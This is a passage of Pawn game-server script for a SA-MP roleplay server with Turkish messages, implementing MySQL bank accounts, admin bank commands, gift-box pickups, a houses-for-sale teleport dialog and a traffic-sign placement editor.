	format(Yazi, 300, "(BANKA) %s(%d) %d nolu banka hesabi olusturdu.", GetName(playerid), playerid, id);
	LOG(Yazi);
	return 1;
}

forward OnBankAccountLogin(playerid, id);
public OnBankAccountLogin(playerid, id)
{
	if(cache_num_rows() > 0) {
	    new string[128], owner[MAX_PLAYER_NAME], ldate[24], lastaccess;
	    cache_get_value_name(0, "Owner", owner);
	    cache_get_value_name(0, "Last", ldate);
	    cache_get_value_name_int(0, "LastAccess", lastaccess);

	    format(string, sizeof(string), "BANKA: {FFFFFF}Hesabýn Sahibi: {F1C40F}%s.", owner);
	    SendClientMessage(playerid, 0x3498DBFF, string);
	    format(string, sizeof(string), "BANKA: {FFFFFF}Son Eriþim: {F1C40F}%s", (lastaccess == 0) ? ("Yok") : ldate);
	    SendClientMessage(playerid, 0x3498DBFF, string);

	    CurrentAccountID[playerid] = id;
	    Bank_ShowMenu(playerid);

	    new query[96];
	    mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET LastAccess=UNIX_TIMESTAMP() WHERE ID=%d && Disabled=0", id);
	    mysql_tquery(BankSQLHandle, query);

	    Bank_SaveLog(playerid, TYPE_LOGIN, id, -1, 0);
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Hatalý Hesap No ve Þifre kombinasyonu!");
	    Bank_ShowMenu(playerid);
	}

	return 1;
}

forward OnBankAccountDeposit(playerid, amount);
public OnBankAccountDeposit(playerid, amount)
{
	if(cache_affected_rows() > 0) {
	    new string[64];
	    format(string, sizeof(string), "BANKA: {FFFFFF}Hesaba Yatýrýlan Para: {2ECC71}%s.", formatInt(amount));
		SendClientMessage(playerid, 0x3498DBFF, string);

	    ParaVer(playerid, -amount);
	    Bank_SaveLog(playerid, TYPE_DEPOSIT, CurrentAccountID[playerid], -1, amount);

		new Yazi[300];
		format(Yazi, 300, "(BANKA) %s(%d) %d nolu banka hesabina %d$ yatirdi.", GetName(playerid), playerid, CurrentAccountID[playerid], amount);
		LOG(Yazi);
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Ýþlem baþarýsýz!");
	}

	Bank_ShowMenu(playerid);
	return 1;
}

forward OnBankAccountWithdraw(playerid, amount);
public OnBankAccountWithdraw(playerid, amount)
{
	if(cache_affected_rows() > 0) {
	    new string[64];
	    format(string, sizeof(string), "BANKA: {FFFFFF}Hesaptan Çekilen Para: {2ECC71}%s.", formatInt(amount));
		SendClientMessage(playerid, 0x3498DBFF, string);

	    ParaVer(playerid, amount);
	    Bank_SaveLog(playerid, TYPE_WITHDRAW, CurrentAccountID[playerid], -1, amount);

		new Yazi[300];
		format(Yazi, 300, "(BANKA) %s(%d) %d nolu banka hesabindan %d$ cekti.", GetName(playerid), playerid, CurrentAccountID[playerid], amount);
		LOG(Yazi);
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Ýþlem baþarýsýz!");
	}

    Bank_ShowMenu(playerid);
	return 1;
}

forward OnBankAccountTransfer(playerid, id, amount);
public OnBankAccountTransfer(playerid, id, amount)
{
	if(cache_affected_rows() > 0) {
		new query[144];
		mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Balance=Balance-%d WHERE ID=%d && Disabled=0", amount, CurrentAccountID[playerid]);
		mysql_tquery(BankSQLHandle, query, "OnBankAccountTransferDone", "iii", playerid, id, amount);
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Ýþlem baþarýsýz!");
	    Bank_ShowMenu(playerid);
	}

	return 1;
}

forward OnBankAccountTransferDone(playerid, id, amount);
public OnBankAccountTransferDone(playerid, id, amount)
{
	if(cache_affected_rows() > 0) {
	    new string[128];
	    format(string, sizeof(string), "BANKA: {FFFFFF}Gönderilen Para: {2ECC71}%s {FFFFFF}Gönderilen Hesap No: {F1C40F}%d.", formatInt(amount), id);
		SendClientMessage(playerid, 0x3498DBFF, string);

		Bank_SaveLog(playerid, TYPE_TRANSFER, CurrentAccountID[playerid], id, amount);

		new Yazi[300];
		format(Yazi, 300, "(BANKA) %s(%d) %d nolu banka hesabindan %d nolu banka hesabina %d$ aktardi.", GetName(playerid), playerid, CurrentAccountID[playerid], id, amount);
		LOG(Yazi);
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Ýþlem Baþarýsýz!");
	}

    Bank_ShowMenu(playerid);
	return 1;
}

forward OnBankAccountPassChange(playerid, newpass[]);
public OnBankAccountPassChange(playerid, newpass[])
{
	if(cache_affected_rows() > 0) {
	    new string[128];
	    format(string, sizeof(string), "BANKA: {FFFFFF}Hesap þifresi {F1C40F}%s {FFFFFF}olarak deðiþtirildi.", newpass);
		SendClientMessage(playerid, 0x3498DBFF, string);

        Bank_SaveLog(playerid, TYPE_PASSCHANGE, CurrentAccountID[playerid], -1, 0);
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Þifre deðiþimi baþarýsýz!");
	}

    Bank_ShowMenu(playerid);
	return 1;
}

forward OnBankAccountDeleted(playerid, id, amount);
public OnBankAccountDeleted(playerid, id, amount)
{
    if(cache_affected_rows() > 0) {
        ParaVer(playerid, amount);

        foreach(new i : Player)
        {
            if(i == playerid) continue;
            if(CurrentAccountID[i] == id) CurrentAccountID[i] = -1;
        }

	    new string[128];
	    format(string, sizeof(string), "BANKA: {FFFFFF}Hesap silindi, hesaptaki {2ECC71}%s {FFFFFF}size verildi.", formatInt(amount));
		SendClientMessage(playerid, 0x3498DBFF, string);

		new Yazi[300];
		format(Yazi, 300, "(BANKA) %s(%d) %d nolu banka hesabini sildi hesaptaki %d$ ona verildi.", GetName(playerid), playerid, id, amount);
		LOG(Yazi);
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Hesap kaldýrma iþlemi baþarýsýz!");
	}

	CurrentAccountID[playerid] = -1;
    Bank_ShowMenu(playerid);
	return 1;
}

forward OnBankAccountAdminEdit(playerid);
public OnBankAccountAdminEdit(playerid)
{
    if(cache_affected_rows() > 0) {
        SendClientMessage(playerid, 0x3498DBFF, "BANK: {FFFFFF}Account edited.");
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "ERROR: {FFFFFF}Account editing failed. (No affected rows)");
	}

	return 1;
}

forward OnBankAccountUserEdit(playerid);
public OnBankAccountUserEdit(playerid)
{
    if(cache_affected_rows() > 0) {
        SendClientMessage(playerid, 0x3498DBFF, "BANKA: {FFFFFF}Banka hesabýnýzýn þifresini deðiþtirdiniz.");
	}else{
	    SendClientMessage(playerid, 0xE74C3CFF, "HATA: {FFFFFF}Bu ID'de banka hesabýnýz yok!");
	}

	return 1;
}

// /banka
CMD:banka(playerid, params[])
{
    SendClientMessage(playerid, -1, "{80FFFF}Bu komut V5.0.0'dan itibaren {F8F8FF}ATM ve Telefon ürünü {80FFFF}olarak kullanýlmaktadýr.");
/*
 Bank_ShowMenu(playerid);*/
	return 1;
}

CMD:bankasifredegis(playerid, params[])
{
    new id, password[16];
    if(sscanf(params, "is[16]", id, password)) return SendClientMessage(playerid, 0xE88732FF, "KULLANIM: {FFFFFF}/bankasifredegis [Hesap ID] [Yeni Þifre]");
    new query[128];
    mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Password=md5('%e') WHERE ID=%d AND Owner='%e'", password, id, GetName(playerid));
    mysql_tquery(BankSQLHandle, query, "OnBankAccountUserEdit", "i", playerid);
	return 1;
}

CMD:asetowner(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
    new id, owner[MAX_PLAYER_NAME];
    if(sscanf(params, "is[24]", id, owner)) return SendClientMessage(playerid, 0xE88732FF, "SYNTAX: {FFFFFF}/asetowner [account id] [new owner]");
    new query[128];
    mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Owner='%e' WHERE ID=%d", owner, id);
    mysql_tquery(BankSQLHandle, query, "OnBankAccountAdminEdit", "i", playerid);
	return 1;
}

CMD:asetpassword(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
    new id, password[16];
    if(sscanf(params, "is[16]", id, password)) return SendClientMessage(playerid, 0xE88732FF, "SYNTAX: {FFFFFF}/asetpassword [account id] [new password]");
    new query[128];
    mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Password=md5('%e') WHERE ID=%d", password, id);
    mysql_tquery(BankSQLHandle, query, "OnBankAccountAdminEdit", "i", playerid);
	return 1;
}

CMD:asetbalance(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
    new id, balance;
    if(sscanf(params, "ii", id, balance)) return SendClientMessage(playerid, 0xE88732FF, "SYNTAX: {FFFFFF}/asetbalance [account id] [balance]");
    if(balance > ACCOUNT_LIMIT) return SendClientMessage(playerid, 0xE74C3CFF, "ERROR: {FFFFFF}Balance you specified exceeds account money limit.");
    new query[128];
    mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Balance=%d WHERE ID=%d", balance, id);
    mysql_tquery(BankSQLHandle, query, "OnBankAccountAdminEdit", "i", playerid);
	return 1;
}

CMD:aclearlogs(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
    new id, type;
    if(sscanf(params, "iI(0)", id, type))
	{
	    SendClientMessage(playerid, 0xE88732FF, "SYNTAX: {FFFFFF}/aclearlogs [account id] [log type (optional)]");
	    SendClientMessage(playerid, 0xE88732FF, "TYPES: {FFFFFF}0- All | 1- Logins | 2- Deposits | 3- Withdraws | 4- Transfers | 5- Password Changes");
		return 1;
	}

	new query[128];
	if(type > 0) {
	    mysql_format(BankSQLHandle, query, sizeof(query), "DELETE FROM bank_logs WHERE AccountID=%d && Type=%d", id, type);
	}else{
	    mysql_format(BankSQLHandle, query, sizeof(query), "DELETE FROM bank_logs WHERE AccountID=%d", id);
	}

    mysql_tquery(BankSQLHandle, query, "OnBankAccountAdminEdit", "i", playerid);
	return 1;
}

CMD:aremoveaccount(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
    new id;
    if(sscanf(params, "i", id)) return SendClientMessage(playerid, 0xE88732FF, "SYNTAX: {FFFFFF}/aremoveaccount [account id]");
    foreach(new i : Player)
    {
        if(CurrentAccountID[i] == id) CurrentAccountID[i] = -1;
    }

    new query[128];
    mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Disabled=1 WHERE ID=%d", id);
    mysql_tquery(BankSQLHandle, query, "OnBankAccountAdminEdit", "i", playerid);
	return 1;
}

CMD:areturnaccount(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
    new id;
    if(sscanf(params, "i", id)) return SendClientMessage(playerid, 0xE88732FF, "SYNTAX: {FFFFFF}/areturnaccount [account id]");
    new query[128];
    mysql_format(BankSQLHandle, query, sizeof(query), "UPDATE bank_accounts SET Disabled=0 WHERE ID=%d", id);
    mysql_tquery(BankSQLHandle, query, "OnBankAccountAdminEdit", "i", playerid);
	return 1;
}

// ************************************************************************************************************************************************************
// Hediye Paketi Sistemi [ Hwang ]
// ************************************************************************************************************************************************************
// /paketekle
CMD:paketekle(playerid)
{
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 1;
 	new Float:hX,Float:hY,Float:hZ;
	GetPlayerPos(playerid, hX, hY, hZ);/*SetPlayerPos(playerid, hX, hY+4, hZ+2);*/
	KutuOlustur(hX+4, hY+4, hZ);
	SendClientMessage(playerid, -1, "{00FF00}Kutu oluþturuldu");
	return true;
}

HediyePaketiPickups(playerid, pickupid)
{
	for (new i = 0; i < MAX_PICKUP; i++)
	{
		if(pickupid == Pickups[i])
		{
			YilbasiPaketi(playerid);
            DestroyDynamicPickup(Pickups[i]);
			Pickups[i] = -1;
		}
	}
	return true;
}

//
YilbasiPaketi(playerid)
{
	GameTextForPlayer(playerid, "~r~Hediye paketi bulundu!", 2000, 3);
	new
		YilbasiRand = random(5);
	switch(YilbasiRand)
	{
	    case 0: RewardPlayer(playerid, 5000, 0), SendClientMessage(playerid, -1, "{00FF00}Kutudan 5.000$ çýktý!");
		case 1: RewardPlayer(playerid, 15000, 0), SendClientMessage(playerid, -1, "{00FF00}Kutudan 15.000$ çýktý!");
		case 2: RewardPlayer(playerid, 0, 5), SendClientMessage(playerid, -1, "{00FF00}Kutudan 5 skor çýktý!");
		case 3: RewardPlayer(playerid, 0, 10), SendClientMessage(playerid, -1, "{00FF00}Kutudan 10 skor çýktý!");
		case 4: SendClientMessage(playerid, -1, "{00FF00}Kutudan bir þey çýkmadý!");
	}

	return true;
}

stock KutuOlustur(Float:x,Float:y,Float:z)
{
	new renkid = random(4);
	switch(renkid)
	{
		case 0: Pickups[Kutu] = CreateDynamicPickup(19054, 15, x, y, z);
		case 1: Pickups[Kutu] = CreateDynamicPickup(19055, 15, x, y, z);
		case 2: Pickups[Kutu] = CreateDynamicPickup(19056, 15, x, y, z);
		case 3: Pickups[Kutu] = CreateDynamicPickup(19058, 15, x, y, z);
	}

	Kutu++;
	return true;
}

// *****************************************************************************
// Houses Komutu Bu Þimdi Çok Önemli Aga Orada Duracan Liselii
// *****************************************************************************
#define DialogHouseArat 8945
new HousesSayfa[MAX_PLAYERS],
	HousesItemID[MAX_PLAYERS][8];

// /houses
CMD:houses(playerid, params[])
{
	HousesSayfa[playerid] = 0;
	ShowHousesDialog(playerid);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Iþýnlanmak istediðiniz satýlýk evi seçiniz.");
	return 1;
}
ShowHousesDialog(playerid)
{
    HousesBosalt(playerid);
    new file[100], HouseIDX, HouseSIDX, HousesDialogText[2000];
	format(HousesDialogText, 2000, "ID\tÞehir\tMax Level\tFiyat\n");
	for(new HouseID; HouseID < MAX_HOUSES; HouseID++)
	{
	    format(file, sizeof(file), HouseFile, HouseID);
	    if(!fexist(file)) continue;
		if(AHouseData[HouseID][Owned] == true) continue;
		if(HouseIDX < HousesSayfa[playerid] * 8)
		{
  			HouseIDX++;
		}else{
  			HouseSIDX++;

			if(HouseSIDX <= 8)
			{
   				format(HousesDialogText, 2000, "%s%d\t%s\t%d\t%d$\n", HousesDialogText, HouseID, Sehirler[ GetPointSehir(AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]) ][CityName], AHouseData[HouseID][HouseMaxLevel], AHouseData[HouseID][HousePrice]);
			    HousesItemID[playerid][HouseSIDX-1] = HouseID;
			}else{
   				if(HousesSayfa[playerid] == 0)
				{
					format(HousesDialogText, 2000, "%s{F8F8FF}Sonraki Sayfa\n", HousesDialogText);
				}else{
					format(HousesDialogText, 2000, "%s{F8F8FF}Önceki Sayfa\n{F8F8FF}Sonraki Sayfa", HousesDialogText);
				}
				break;
			}
		}

	}

	ShowPlayerDialog(playerid, DialogHouseArat, DIALOG_STYLE_TABLIST_HEADERS, "{FFCC00}» {FFFFFF}Satýlýk Evler", HousesDialogText, "Seç", "Kapat");
	return 1;
}

HousesBosalt(playerid)
{
	for(new i; i < 8; i++)
	{
	    HousesItemID[playerid][i] = -1;
	}
}

HousesDialog(playerid, dialogid, response, listitem)
{
	switch(dialogid)
	{
	    case DialogHouseArat:
	    {
	        if(response)
	        {
	            switch(listitem)
	            {
	                case 8:
	                {
	                    if(HousesSayfa[playerid] == 0)
	                    {
	                    	HousesSayfa[playerid]++;
	                    	ShowHousesDialog(playerid);
						}else{
						    HousesSayfa[playerid]--;
						    ShowHousesDialog(playerid);
						}
					}

					case 9:
					{
						HousesSayfa[playerid]++;
						ShowHousesDialog(playerid);
					}

					default:
					{
					    if(HousesItemID[playerid][listitem] == -1) return SendClientMessage(playerid, -1, "{FF0000}Olmayan bir evi seçemezsiniz!");
					    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Araçta iken satýlýk evlere ýþýnlanamazsýnýz!");
					    SetPlayerPos(playerid, AHouseData[ HousesItemID[playerid][listitem] ][HouseX], AHouseData[ HousesItemID[playerid][listitem] ][HouseY], AHouseData[ HousesItemID[playerid][listitem] ][HouseZ]);
					    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Satýlýk eve ýþýnlandýnýz!");
					}
	            }
	        }
	    }
	}
	return 1;
}

/*
enum CityInfo
{
	CityName[35],
	Float:CityMinX,
	Float:CityMinY,
	Float:CityMaxX,
	Float:CityMaxY
};

new Sehirler[4][CityInfo]={
{"Los Santos", -1228.114135, -3150.904785, 3038.955322, 454.851440}, // 1. Bölge
{"San Fierro", -3439.908691, -3150.904785, -1228.114135, 1583.512817}, // 1. Bölge
{"Bayside", -3439.908691, 1583.512817, -1228.114135, 3117.281982}, // 2. Bölge
{"Las Venturas", -1228.114135, 454.851440, 3038.955322, 3117.281982} // 2. Bölge
};

*/

// ************************************************************************************************************************************************************
// Puþt Tabela Sistemi [ suleyman70 ]
// ************************************************************************************************************************************************************
stock TrafikGuncelle()
{
	Levhalar = 0;
	for(new i; i < MAX_OBJECTS; i++)
	{
	    DestroyObject(Objs[i]);
	    Objs[i] = 0;
	}

	if(fexist(DOSYA))
	{
	new File:handle = fopen(DOSYA), buf[1028];
	if(handle)
	{
		while(fread(handle, buf)){
		    if(strlen(buf) != 0)
			{
		    	new deger[128], modelid, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz, boyut, irenk[24], trenk[24], virgul[10];
	     		virgul[0] = strfind(buf, ",", true);
		    	strmid(deger, buf, 0, virgul[0]);
		    	modelid = strval(deger);
 	     		virgul[1] = strfind(buf, ",", true, virgul[0]+1);
		    	strmid(deger, buf, virgul[0]+1, virgul[1]);
		    	x = floatstr(deger);
 	     		virgul[2] = strfind(buf, ",", true, virgul[1]+1);
		    	strmid(deger, buf, virgul[1]+1, virgul[2]);
		    	y = floatstr(deger);
		    	virgul[3] = strfind(buf, ",", true, virgul[2]+1);
		    	strmid(deger, buf, virgul[2]+1, virgul[3]);
		    	z = floatstr(deger);
		    	virgul[4] = strfind(buf, ",", true, virgul[3]+1);
		    	strmid(deger, buf, virgul[3]+1, virgul[4]);
		    	rx = floatstr(deger);
		    	virgul[5] = strfind(buf, ",", true, virgul[4]+1);
		    	strmid(deger, buf, virgul[4]+1, virgul[5]);
		    	ry = floatstr(deger);
		    	virgul[6] = strfind(buf, ",", true, virgul[5]+1);
		    	strmid(deger, buf, virgul[5]+1, virgul[6]);
		    	rz = floatstr(deger);
		    	virgul[7] = strfind(buf, ",", true, virgul[6]+1);
		    	strmid(deger, buf, virgul[6]+1, virgul[7]);
		    	boyut = strval(deger);
		    	virgul[8] = strfind(buf, ",", true, virgul[7]+1);
		    	strmid(deger, buf, virgul[7]+1, virgul[8]);
		    	format(irenk, 24, "%s", deger);
		    	virgul[9] = strfind(buf, ",", true, virgul[8]+1);
		   	 	strmid(deger, buf, virgul[8]+1, virgul[9]);
		   		format(trenk, 24, "%s", deger);

		    	strmid(deger, buf, virgul[9]+1, strlen(buf));
	    		new var0[256];
				new cs[4] = -255;
				new satir0[128], satir1[128], satir2[128], satir3[128];

				cs[0] = strfind(deger, "|", true);
				strmid(satir0, deger, 0, cs[0]);
				if(cs[0] == -1){
	    			format(var0, sizeof(var0), "%s", deger);
				}
				else
				{
					cs[1] = strfind(deger, "|", true, cs[0]+1);
					strmid(satir1, deger, cs[0]+1, cs[1]);
					if(cs[1] == -1){
					strmid(satir1, deger, cs[0]+1, strlen(deger));
					format(var0, sizeof(var0), "%s\n%s", satir0, satir1);
					}
					else
					{
					cs[2] = strfind(deger, "|", true, cs[1]+1);
					strmid(satir2, deger, cs[1]+1, cs[2]);
					if(cs[2] == -1){
					strmid(satir2, deger, cs[1]+1, strlen(deger));
					format(var0, sizeof(var0), "%s\n%s\n%s", satir0, satir1, satir2);
					}
					else
					{
					strmid(satir3, deger, cs[2]+1, strlen(deger));
					format(var0, sizeof(var0), "%s\n%s\n%s\n%s", satir0, satir1, satir2, satir3);
					}
			}
			}
				Objs[Levhalar] = CreateObject(modelid, x, y, z, rx, ry, rz, 100);
				if(modelid == OB5)
	{
	SetObjectMaterialText(Objs[Levhalar], var0, 2, OBJECT_MATERIAL_SIZE_256x128,
	"Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
	}
				if(modelid == OB6)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 3, OBJECT_MATERIAL_SIZE_512x128,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB7)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 0, OBJECT_MATERIAL_SIZE_256x128,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB8)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 0, OBJECT_MATERIAL_SIZE_64x64,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB10)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 1, OBJECT_MATERIAL_SIZE_256x128,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB11)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 1, OBJECT_MATERIAL_SIZE_256x128,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB12)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 1, OBJECT_MATERIAL_SIZE_256x128,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB13)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 2, OBJECT_MATERIAL_SIZE_64x64,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB23)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 2, OBJECT_MATERIAL_SIZE_64x64,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB24)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 2, OBJECT_MATERIAL_SIZE_64x64,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB25)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 2, OBJECT_MATERIAL_SIZE_128x64,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
				if(modelid == OB29)
	{
    SetObjectMaterialText(Objs[Levhalar], var0, 2, OBJECT_MATERIAL_SIZE_128x32,
    "Arial", boyut, 0, HexToInt(irenk), HexToInt(trenk), OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
    }
       			Levhalar++;
			}
		}
		fseek(handle, _, seek_end);
		fclose(handle);
		print("\n-----------------------------------------");
		print("  Trafik Ýþaret ve Levhalarý scripti yüklendi.");
		print("  Gtaturk.com - suleyman70");
		printf("  Yüklenen levhalar: %i adet", Levhalar);
		print("-----------------------------------------\n");
	}
	else
	{
		print("Trafik Ýþaret ve Levhalarý Scripti Dosya Baðlantý Hatasý!");
	}
	}
 	else
 	{
 	    print("\n-----------------------------------------");
 	    printf("  %s dosyasý scriptfiles klasöründe bulunamadý!", DOSYA);
 	    print("-----------------------------------------\n");
 	}
 	return 1;
 }

CMD:trafik(playerid, params[])
{
	#pragma unused params
	if(APlayerData[playerid][PlayerLevel] < 6) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	if(pObj[playerid] != -255) return SendClientMessage(playerid, -1, "{FF0000}<!> {ffffff}Zaten baþka bir levha düzenliyorsunuz!");
	new var0[256];
	format(var0, sizeof(var0), "%s\n%s\n%s\n%s", OBJ1, OBJ2, OBJ3, OBJ4);
	new var1[256];
	format(var1, sizeof(var1), "%s\n%s\n%s\n%s\n%s", OBJ5, OBJ6, OBJ7, OBJ8, OBJ9);
	new var2[256];
	format(var2, sizeof(var2), "%s\n%s\n%s\n%s\n%s", OBJ10, OBJ11, OBJ12, OBJ13, OBJ14);
	new var3[256];
	format(var3, sizeof(var3), "%s\n%s\n%s\n%s\n%s", OBJ15, OBJ16, OBJ17, OBJ18, OBJ19);
	new var4[256];
	format(var4, sizeof(var4), "%s\n%s\n%s\n%s\n%s", OBJ20, OBJ21, OBJ22, OBJ23, OBJ24);
	new var5[256];
	format(var5, sizeof(var5), "%s\n%s\n%s\n%s\n%s", OBJ25, OBJ26, OBJ27, OBJ28, OBJ29);
	new var6[1024];
	format(var6, sizeof(var6), "%s\n%s\n%s\n%s\n%s\n%s", var0, var1, var2, var3, var4, var5);
	ShowPlayerDialog(playerid, 954, DIALOG_STYLE_LIST, "Ýþaretçi tipi seçiniz", var6, "Tamam", "Iptal");
	format(iRenk[playerid], 24, "0xFFFFFFFF");
	format(tRenk[playerid], 24, "0xFF005100");
	return 1;
}

CMD:ix(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");
	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/ix deðer(float)");
	new Float:x,Float:y,Float:z;
	GetObjectPos(pObj[playerid], x, y, z);
	SetObjectPos(pObj[playerid], x+floatstr(params), y, z);
	return 1;
}

CMD:iy(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");
	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/iy deðer(float)");
	new Float:x,Float:y,Float:z;
	GetObjectPos(pObj[playerid], x, y, z);
	SetObjectPos(pObj[playerid], x, y+floatstr(params), z);
	return 1;
}

CMD:iz(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");
	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/iz deðer(float)");
	new Float:x,Float:y,Float:z;
	GetObjectPos(pObj[playerid], x, y, z);
	SetObjectPos(pObj[playerid], x, y, z+floatstr(params));
	return 1;
}

CMD:irx(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");
	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/irx deðer(float)");
	new Float:x,Float:y,Float:z;
	GetObjectRot(pObj[playerid], x, y, z);
	SetObjectRot(pObj[playerid], x+floatstr(params), y, z);
	return 1;
}

CMD:iry(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");
	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/iry deðer(float)");
	new Float:x,Float:y,Float:z;
	GetObjectRot(pObj[playerid], x, y, z);
	SetObjectRot(pObj[playerid], x, y+floatstr(params), z);
	return 1;
}

CMD:irz(playerid, params[])
{
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");
	if(strlen(params) == 0) return SendClientMessage(playerid, -1, "{00ff00}<KULLANIM> {ffffff}/irz deðer(float)");
	new Float:x,Float:y,Float:z;
	GetObjectRot(pObj[playerid], x, y, z);
	SetObjectRot(pObj[playerid], x, y, z+floatstr(params));
	return 1;
}

CMD:tiptal(playerid, params[])
{
	#pragma unused params
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");

	DestroyObject(pObj[playerid]);
	pObj[playerid] = -255;
	SendClientMessage(playerid, -1, "{00ff00}<?> {ffffff}Levha baþarýyla kaldýrýldý.");
	return 1;
}

CMD:ikaydet(playerid, params[])
{
	#pragma unused params
	if(pObj[playerid] == -255) return SendClientMessage(playerid, -1, "{ff0000}<!> {ffffff}Herhangi bir levha düzenlemiyorsunuz!");

	if(fexist(DOSYA))
	{
	new File:handle = fopen(DOSYA), buf[128], levha[1028];
	new Float:x,Float:y,Float:z,Float:rx,Float:ry,Float:rz;
	GetObjectPos(pObj[playerid], x, y, z);
	GetObjectRot(pObj[playerid], rx, ry, rz);
